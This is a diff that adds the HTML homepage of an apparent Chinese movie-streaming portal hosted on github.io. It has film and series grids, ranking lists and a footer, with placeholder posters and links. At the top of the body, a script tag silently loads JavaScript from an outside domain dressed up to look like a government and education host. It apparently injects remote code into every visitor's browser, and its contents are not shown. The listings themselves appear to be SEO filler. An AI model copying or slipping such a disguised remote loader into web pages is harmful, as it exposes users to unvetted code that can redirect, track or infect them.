@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>51电影网 - 51dianyingwang-wap | 高清电影电视剧综艺动漫在线观看</title>
+<meta name="keywords" content="51电影网, 51dianyingwang-wap, 高清电影, 在线看电影, 热播电视剧, 综艺节目, 动漫, 影视资源, 免费观影">
+<meta name="description" content="51电影网（51dianyingwang-wap）为您提供最新最热的高清电影、电视剧、综艺、动漫在线观看，分类清晰、每日精选更新，全站移动端自适应，找好片就上51电影网。">
+<link rel="canonical" href="https://51dianyingwang-wap.github.io">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow,max-image-preview:large">
+<meta name="theme-color" content="#0a0a0c">
+<style>
+:root{
+  --gold:#d4af37; --gold2:#f0d68a; --gold3:#8a6d1f;
+  --bg:#0a0a0c; --bg2:#121216; --card:#16161c; --line:#33323c;
+  --txt:#f4f2ea; --sub:#a4a19a;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",serif;
+  background:var(--bg);color:var(--txt);line-height:1.7;overflow-x:hidden;min-height:100vh;
+  background-image:
+    radial-gradient(ellipse at 50% -10%,rgba(212,175,55,.16),transparent 55%),
+    linear-gradient(180deg,#0a0a0c,#121216 45%,#0a0a0c);
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+::selection{background:var(--gold);color:#000}
+
+/* ===== 顶栏 ===== */
+header{position:sticky;top:0;z-index:50;background:rgba(10,10,12,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.bar{max-width:1240px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:12px}
+.logo{width:48px;height:48px;border-radius:50%;background:radial-gradient(circle at 32% 30%,var(--gold2),var(--gold) 55%,var(--gold3));display:grid;place-items:center;font-size:15px;font-weight:900;color:#1a1405;box-shadow:0 0 0 2px rgba(212,175,55,.25),0 0 22px rgba(212,175,55,.35)}
+.brand h1{font-size:21px;letter-spacing:.5px}
+.brand h1 small{display:block;font-size:11px;font-weight:400;color:var(--sub);letter-spacing:1px}
+.search{flex:1;min-width:170px;position:relative}
+.search input{width:100%;padding:11px 52px 11px 16px;border-radius:0;border:1px solid var(--line);background:rgba(255,255,255,.04);color:var(--txt);font-size:14px;outline:none}
+.search input:focus{border-color:var(--gold)}
+.search button{position:absolute;right:0;top:0;height:100%;padding:0 20px;border:0;background:var(--gold);color:#1a1405;font-weight:800;cursor:pointer;letter-spacing:1px}
+.menu-btn{display:none;width:44px;height:44px;border:1px solid var(--line);background:transparent;color:var(--gold);font-size:20px;cursor:pointer}
+nav.tabs{max-width:1240px;margin:0 auto;padding:0 20px;display:flex;gap:0;flex-wrap:wrap;border-top:1px solid var(--line)}
+nav.tabs a{padding:13px 22px;font-size:14px;font-weight:600;position:relative;transition:.2s}
+nav.tabs a:hover{color:var(--gold)}
+nav.tabs a::after{content:"";position:absolute;left:0;right:0;bottom:-1px;height:2px;background:var(--gold);transform:scaleX(0);transition:.25s}
+nav.tabs a:hover::after{transform:scaleX(1)}
+
+/* ===== 主视觉 ===== */
+.hero{max-width:1240px;margin:28px auto 0;padding:0 20px}
+.hero-in{position:relative;border:1px solid var(--line);background:linear-gradient(135deg,rgba(212,175,55,.08),rgba(255,255,255,.02));padding:46px 40px;overflow:hidden}
+.hero-in::before{content:"";position:absolute;width:420px;height:420px;border:1px solid rgba(212,175,55,.18);border-radius:50%;right:-160px;top:-120px}
+.hero-in::after{content:"";position:absolute;width:260px;height:260px;border:1px solid rgba(212,175,55,.14);border-radius:50%;right:20px;bottom:-120px}
+.kicker{display:inline-block;font-size:12px;letter-spacing:3px;color:var(--gold);border:1px solid var(--gold);padding:4px 14px;margin-bottom:18px}
+.hero-in h2{font-size:40px;line-height:1.25;font-weight:900;position:relative;z-index:2}
+.hero-in h2 span{color:var(--gold);font-style:italic;font-family:Georgia,serif}
+.hero-in p{color:var(--sub);font-size:15px;max-width:560px;margin-top:16px;position:relative;z-index:2}
+.hero-cta{margin-top:26px;display:flex;gap:12px;flex-wrap:wrap;position:relative;z-index:2}
+.btn{border:1px solid var(--gold);padding:11px 26px;font-size:14px;font-weight:700;letter-spacing:1px;transition:.25s;cursor:pointer}
+.btn.main{background:var(--gold);color:#1a1405}
+.btn.main:hover{background:var(--gold2)}
+.btn.ghost{color:var(--gold)}
+.btn.ghost:hover{background:var(--gold);color:#1a1405}
+
+/* ===== 通用 ===== */
+section{max-width:1240px;margin:56px auto 0;padding:0 20px}
+.head{display:flex;align-items:baseline;gap:12px;margin-bottom:22px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:12px}
+.head h3{font-size:23px;font-weight:900;letter-spacing:.5px}
+.head h3 em{font-style:normal;color:var(--gold);font-family:Georgia,serif;margin-right:8px}
+.head a.more{margin-left:auto;font-size:13px;color:var(--sub)}
+.head a.more:hover{color:var(--gold)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(162px,1fr));gap:20px}
+.film{background:var(--card);border:1px solid var(--line);transition:.3s}
+.film:hover{transform:translateY(-7px);border-color:var(--gold);box-shadow:0 16px 34px rgba(0,0,0,.6),0 0 0 1px rgba(212,175,55,.3)}
+.poster{position:relative;aspect-ratio:3/4;overflow:hidden}
+.poster img{width:100%;height:100%;object-fit:cover;transition:.5s;filter:saturate(.92)}
+.film:hover .poster img{transform:scale(1.07);filter:saturate(1.05)}
+.tag{position:absolute;left:0;top:0;background:var(--gold);color:#1a1405;font-size:11px;font-weight:800;padding:4px 11px;letter-spacing:.5px}
+.rate{position:absolute;right:8px;bottom:8px;background:rgba(10,10,12,.9);color:var(--gold2);font-size:12px;font-weight:800;padding:3px 9px;border:1px solid rgba(212,175,55,.5);font-family:Georgia,serif}
+.info{padding:13px 14px;border-top:1px solid var(--line)}
+.info b{font-size:14.5px;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden}
+.info span{font-size:12px;color:var(--sub);display:block;margin-top:5px}
+
+/* ===== 双列特色区 ===== */
+.split{display:grid;grid-template-columns:1.15fr .85fr;gap:24px;align-items:start}
+.panel{border:1px solid var(--line);background:var(--card)}
+.panel-h{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--line)}
+.panel-h b{font-size:15px;letter-spacing:1px}
+.panel-h b::before{content:"◆";color:var(--gold);margin-right:8px;font-size:11px}
+.panel-h span{font-size:12px;color:var(--sub)}
+table{width:100%;border-collapse:collapse}
+table td{padding:11px 18px;border-bottom:1px dashed var(--line);font-size:13.5px}
+table tr:last-child td{border:0}
+table tr:hover{background:rgba(212,175,55,.05)}
+table .idx{color:var(--gold);font-family:Georgia,serif;width:34px;font-weight:800}
+table .tm{color:var(--sub);font-family:Georgia,serif}
+.glist li{display:flex;gap:14px;align-items:center;padding:11px 18px;border-bottom:1px dashed var(--line)}
+.glist li:last-child{border:0}
+.glist .no{width:26px;height:26px;flex-shrink:0;background:var(--gold);color:#1a1405;font-size:12px;font-weight:900;display:grid;place-items:center}
+.glist li:nth-child(2) .no{background:transparent;border:1px solid var(--gold);color:var(--gold)}
+.glist li:nth-child(3) .no{background:transparent;border:1px solid var(--line);color:var(--sub)}
+.glist .ttl{flex:1;font-size:14px}
+.glist .yr{font-size:12px;color:var(--sub);font-family:Georgia,serif}
+
+/* ===== 榜单 ===== */
+.ranks{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.rk{border:1px solid var(--line);background:var(--card);padding:20px}
+.rk h4{font-size:16px;margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--line);letter-spacing:1px}
+.rk h4 em{font-style:normal;color:var(--gold);font-family:Georgia,serif}
+.rk li{display:flex;gap:12px;align-items:center;padding:10px 0;border-bottom:1px dashed rgba(255,255,255,.07)}
+.rk li:last-child{border:0}
+.n{width:30px;height:30px;flex-shrink:0;border:1px solid var(--line);font-size:13px;font-weight:800;display:grid;place-items:center;font-family:Georgia,serif}
+.rk li:nth-child(1) .n{background:var(--gold);border-color:var(--gold);color:#1a1405}
+.rk li:nth-child(2) .n{border-color:var(--gold);color:var(--gold)}
+.rk li:nth-child(3) .n{border-color:var(--gold2);color:var(--gold2)}
+.ttl{flex:1;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hot{font-size:12px;color:var(--sub);font-family:Georgia,serif}
+
+/* ===== 关于 ===== */
+.intro{border:1px solid var(--line);background:linear-gradient(135deg,rgba(212,175,55,.06),rgba(255,255,255,.02));padding:32px;position:relative;overflow:hidden}
+.intro::after{content:"51";position:absolute;right:-6px;bottom:-34px;font-size:180px;font-weight:900;font-family:Georgia,serif;color:rgba(212,175,55,.07);line-height:1}
+.intro h3{font-size:21px;margin-bottom:16px;position:relative}
+.intro h3 em{font-style:normal;color:var(--gold)}
+.intro p{color:var(--sub);margin-bottom:12px;font-size:14.5px;position:relative}
+.feats{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:9px 20px;margin-top:12px;position:relative}
+.feats li{padding-left:20px;position:relative;font-size:14px}
+.feats li::before{content:"✧";position:absolute;left:0;color:var(--gold)}
+
+/* ===== 页脚 ===== */
+footer{margin-top:64px;border-top:1px solid var(--line);background:var(--bg2)}
+.ft{max-width:1240px;margin:0 auto;padding:38px 20px 20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:28px}
+.ft h5{font-size:14px;color:var(--gold);letter-spacing:1px;margin-bottom:14px}
+.ft a{display:block;color:var(--sub);font-size:13px;padding:4px 0}
+.ft a:hover{color:var(--gold2)}
+.copy{max-width:1240px;margin:0 auto;padding:20px;border-top:1px solid var(--line);font-size:12px;color:var(--sub);text-align:center}
+.copy b{color:var(--gold)}
+
+/* ===== 响应式 ===== */
+@media(max-width:760px){
+  .menu-btn{display:block}
+  nav.tabs{flex-direction:column;max-height:0;overflow:hidden;padding:0 20px;transition:.3s}
+  nav.tabs.open{max-height:440px;padding:6px 20px}
+  nav.tabs a{padding:11px 14px;border-bottom:1px solid var(--line)}
+  nav.tabs a:last-child{border:0}
+  nav.tabs a::after{display:none}
+  .hero-in{padding:30px 22px}
+  .hero-in h2{font-size:27px}
+  .hero-in::before,.hero-in::after{display:none}
+  .split{grid-template-columns:1fr}
+  .grid{grid-template-columns:repeat(auto-fill,minmax(132px,1fr));gap:13px}
+  .head h3{font-size:19px}
+  .intro::after{font-size:110px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<header>
+  <div class="bar">
+    <div class="brand">
+      <div class="logo" aria-hidden="true">51</div>
+      <h1>51电影网<small>51DIANYINGWANG-WAP</small></h1>
+    </div>
+    <div class="search">
+      <input type="search" placeholder="搜索电影 / 剧集 / 综艺 / 动漫..." aria-label="搜索">
+      <button type="button">搜索</button>
+    </div>
+    <button class="menu-btn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+  <nav class="tabs" id="tabs">
+    <a href="#home">首页</a>
+    <a href="#movie">电影</a>
+    <a href="#tv">电视剧</a>
+    <a href="#show">综艺</a>
+    <a href="#anime">动漫</a>
+    <a href="#rank">排行榜</a>
+  </nav>
+</header>
+
+<main>
+  <div class="hero" id="home">
+    <div class="hero-in">
+      <span class="kicker">51 FILM · 精选影视</span>
+      <h2>看片这件小事，<br>交给 <span>51</span> 就够了</h2>
+      <p>51电影网（51dianyingwang-wap）精选院线大片、热播剧集、口碑综艺与高分动漫，每日更新，全站自适应播放，手机、平板、电脑一样流畅。</p>
+      <div class="hero-cta">
+        <a class="btn main" href="#movie">立即观影</a>
+        <a class="btn ghost" href="#rank">查看榜单</a>
+      </div>
+    </div>
+  </div>
+
+  <section id="movie">
+    <div class="head">
+      <h3><em>01</em>电影频道</h3>
+      <a class="more" href="#">全部电影 ›</a>
+    </div>
+    <div class="grid">
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">动作</span><span class="rate">9.3</span><img src="https://picsum.photos/seed/a1/300/400" alt="电影海报：极速突围"></div>
+        <div class="info"><b>极速突围</b><span>2026 · 动作 / 犯罪</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">爱情</span><span class="rate">8.7</span><img src="https://picsum.photos/seed/a2/300/400" alt="电影海报：半城烟雨"></div>
+        <div class="info"><b>半城烟雨</b><span>2025 · 爱情 / 文艺</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">科幻</span><span class="rate">8.9</span><img src="https://picsum.photos/seed/a3/300/400" alt="电影海报：深空回响"></div>
+        <div class="info"><b>深空回响</b><span>2026 · 科幻 / 冒险</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">喜剧</span><span class="rate">8.5</span><img src="https://picsum.photos/seed/a4/300/400" alt="电影海报：乌龙保镖"></div>
+        <div class="info"><b>乌龙保镖</b><span>2026 · 喜剧 / 动作</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">悬疑</span><span class="rate">9.1</span><img src="https://picsum.photos/seed/a5/300/400" alt="电影海报：第七个目击者"></div>
+        <div class="info"><b>第七个目击者</b><span>2025 · 悬疑 / 惊悚</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">动画</span><span class="rate">8.8</span><img src="https://picsum.photos/seed/a6/300/400" alt="电影海报：金色的海"></div>
+        <div class="info"><b>金色的海</b><span>2026 · 动画 / 奇幻</span></div>
+      </a>
+    </div>
+  </section>
+
+  <section id="tv">
+    <div class="head">
+      <h3><em>02</em>电视剧频道</h3>
+      <a class="more" href="#">全部剧集 ›</a>
+    </div>
+    <div class="split">
+      <div class="panel">
+        <div class="panel-h"><b>热播连载</b><span>每日更新</span></div>
+        <table>
+          <tr><td class="idx">01</td><td>大明王朝</td><td class="tm">古装 · 40集</td><td>🔥 1180万</td></tr>
+          <tr><td class="idx">02</td><td>长风渡</td><td class="tm">古装 · 28集</td><td>🔥 962万</td></tr>
+          <tr><td class="idx">03</td><td>无声的证言</td><td class="tm">刑侦 · 10集</td><td>🔥 845万</td></tr>
+          <tr><td class="idx">04</td><td>热血防线</td><td class="tm">军旅 · 32集</td><td>🔥 723万</td></tr>
+          <tr><td class="idx">05</td><td>逆光而行</td><td class="tm">都市 · 14集</td><td>🔥 601万</td></tr>
+          <tr><td class="idx">06</td><td>心动警报</td><td class="tm">爱情 · 20集</td><td>🔥 558万</td></tr>
+        </table>
+      </div>
+      <div class="panel">
+        <div class="panel-h"><b>高分完结</b><span>口碑精选</span></div>
+        <ul class="glist">
+          <li><span class="no">1</span><span class="ttl">漫长的季节</span><span class="yr">2025</span></li>
+          <li><span class="no">2</span><span class="ttl">沉默的真相</span><span class="yr">2024</span></li>
+          <li><span class="no">3</span><span class="ttl">山海情</span><span class="yr">2024</span></li>
+          <li><span class="no">4</span><span class="ttl">琅琊榜</span><span class="yr">2023</span></li>
+          <li><span class="no">5</span><span class="ttl">甄嬛传</span><span class="yr">2023</span></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section id="show">
+    <div class="head">
+      <h3><em>03</em>综艺频道</h3>
+      <a class="more" href="#">全部综艺 ›</a>
+    </div>
+    <div class="grid">
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.9</span><img src="https://picsum.photos/seed/b1/300/400" alt="综艺海报：出发吧旅行团"></div>
+        <div class="info"><b>出发吧旅行团</b><span>户外真人秀 · 第5季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.6</span><img src="https://picsum.photos/seed/b2/300/400" alt="综艺海报：声临其境"></div>
+        <div class="info"><b>声临其境</b><span>声音竞演 · 第4季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.4</span><img src="https://picsum.photos/seed/b3/300/400" alt="综艺海报：厨神对决"></div>
+        <div class="info"><b>厨神对决</b><span>美食竞技 · 第9季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.7</span><img src="https://picsum.photos/seed/b4/300/400" alt="综艺海报：爆笑星期天"></div>
+        <div class="info"><b>爆笑星期天</b><span>喜剧竞演 · 第3季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.3</span><img src="https://picsum.photos/seed/b5/300/400" alt="综艺海报：穿越吧兄弟"></div>
+        <div class="info"><b>穿越吧兄弟</b><span>户外挑战 · 第6季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.5</span><img src="https://picsum.photos/seed/b6/300/400" alt="综艺海报：少年说唱王"></div>
+        <div class="info"><b>少年说唱王</b><span>音乐选拔 · 第2季</span></div>
+      </a>
+    </div>
+  </section>
+
+  <section id="anime">
+    <div class="head">
+      <h3><em>04</em>动漫频道</h3>
+      <a class="more" href="#">全部动漫 ›</a>
+    </div>
+    <div class="split">
+      <div class="panel">
+        <div class="panel-h"><b>国漫热榜</b><span>持续连载</span></div>
+        <ul class="glist">
+          <li><span class="no">1</span><span class="ttl">果核重生</span><span class="yr">54集</span></li>
+          <li><span class="no">2</span><span class="ttl">剑与少年</span><span class="yr">38集</span></li>
+          <li><span class="no">3</span><span class="ttl">幻境迷踪</span><span class="yr">30集</span></li>
+          <li><span class="no">4</span><span class="ttl">甜品少女</span><span class="yr">20集</span></li>
+          <li><span class="no">5</span><span class="ttl">星辰变</span><span class="yr">60集</span></li>
+        </ul>
+      </div>
+      <div class="panel">
+        <div class="panel-h"><b>日漫精选</b><span>经典回归</span></div>
+        <table>
+          <tr><td class="idx">01</td><td>银河摆渡人</td><td class="tm">科幻 · 26集</td><td>9.0</td></tr>
+          <tr><td class="idx">02</td><td>深海奇缘</td><td class="tm">冒险 · 13集</td><td>8.9</td></tr>
+          <tr><td class="idx">03</td><td>风之语</td><td class="tm">治愈 · 24集</td><td>8.7</td></tr>
+          <tr><td class="idx">04</td><td>机械之心</td><td class="tm">机战 · 12集</td><td>8.6</td></tr>
+          <tr><td class="idx">05</td><td>夏日友人帐</td><td class="tm">治愈 · 12集</td><td>9.2</td></tr>
+          <tr><td class="idx">06</td><td>暗夜侦探</td><td class="tm">悬疑 · 22集</td><td>8.8</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="head"><h3><em>05</em>51 热播榜</h3><a class="more" href="#">完整榜单 ›</a></div>
+    <div class="ranks">
+      <div class="rk">
+        <h4><em>TOP</em> 电影榜</h4>
+        <ul>
+          <li><span class="n">1</span><span class="ttl">极速突围</span><span class="hot">1024万</span></li>
+          <li><span class="n">2</span><span class="ttl">第七个目击者</span><span class="hot">896万</span></li>
+          <li><span class="n">3</span><span class="ttl">深空回响</span><span class="hot">778万</span></li>
+          <li><span class="n">4</span><span class="ttl">半城烟雨</span><span class="hot">654万</span></li>
+          <li><span class="n">5</span><span class="ttl">乌龙保镖</span><span class="hot">532万</span></li>
+        </ul>
+      </div>
+      <div class="rk">
+        <h4><em>TOP</em> 剧集榜</h4>
+        <ul>
+          <li><span class="n">1</span><span class="ttl">大明王朝</span><span class="hot">1180万</span></li>
+          <li><span class="n">2</span><span class="ttl">长风渡</span><span class="hot">962万</span></li>
+          <li><span class="n">3</span><span class="ttl">无声的证言</span><span class="hot">845万</span></li>
+          <li><span class="n">4</span><span class="ttl">热血防线</span><span class="hot">723万</span></li>
+          <li><span class="n">5</span><span class="ttl">逆光而行</span><span class="hot">601万</span></li>
+        </ul>
+      </div>
+      <div class="rk">
+        <h4><em>TOP</em> 综合榜</h4>
+        <ul>
+          <li><span class="n">1</span><span class="ttl">果核重生</span><span class="hot">1380万</span></li>
+          <li><span class="n">2</span><span class="ttl">出发吧旅行团</span><span class="hot">1086万</span></li>
+          <li><span class="n">3</span><span class="ttl">幻境迷踪</span><span class="hot">932万</span></li>
+          <li><span class="n">4</span><span class="ttl">厨神对决</span><span class="hot">754万</span></li>
+          <li><span class="n">5</span><span class="ttl">爆笑星期天</span><span class="hot">628万</span></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="intro">
+      <h3>关于 <em>51电影网</em></h3>
+      <p>51电影网（51dianyingwang-wap）是专注于高清影视在线观看的服务平台，网站地址 <b>https://51dianyingwang-wap.github.io</b>。我们以「精挑细选」为原则，为观众打造干净、高效的观影入口，让找片、看片更省心。</p>
+      <ul class="feats">
+        <li>每日精选更新，院线大片与热播剧集同步上新</li>
+        <li>覆盖电影、电视剧、综艺、动漫四大核心分类</li>
+        <li>全站移动端自适应，手机浏览器原生级体验</li>
+        <li>热门榜单 + 专题推荐，快速发现好内容</li>
+        <li>界面简洁、加载迅速，专注观影本身</li>
+        <li>关键词搜索精准定位，想看什么一搜即得</li>
+      </ul>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="ft">
+    <div>
+      <h5>51电影网</h5>
+      <a href="https://51dianyingwang-wap.github.io">https://51dianyingwang-wap.github.io</a>
+      <a href="#about">关于本站</a>
+      <a href="#">商务合作</a>
+    </div>
+    <div>
+      <h5>影视分类</h5>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#show">综艺</a>
+      <a href="#anime">动漫</a>
+    </div>
+    <div>
+      <h5>热门栏目</h5>
+      <a href="#rank">热播排行榜</a>
+      <a href="#">高分推荐</a>
+      <a href="#">新片速递</a>
+      <a href="#">专题合集</a>
+    </div>
+    <div>
+      <h5>帮助中心</h5>
+      <a href="#">播放问题</a>
+      <a href="#">意见反馈</a>
+      <a href="#">使用协议</a>
+    </div>
+  </div>
+  <div class="copy">
+    © 2026 <b>51电影网</b> 51dianyingwang-wap 版权所有 · 网站名称：51电影网 · 网站网址：https://51dianyingwang-wap.github.io<br>
+    本页面所有内页链接均以 # 占位，如需收录请替换为真实可访问链接。
+  </div>
+</footer>
+
+<script>
+document.getElementById('mBtn').addEventListener('click',function(){
+  document.getElementById('tabs').classList.toggle('open');
+});
+</script>
+</body>
+</html>
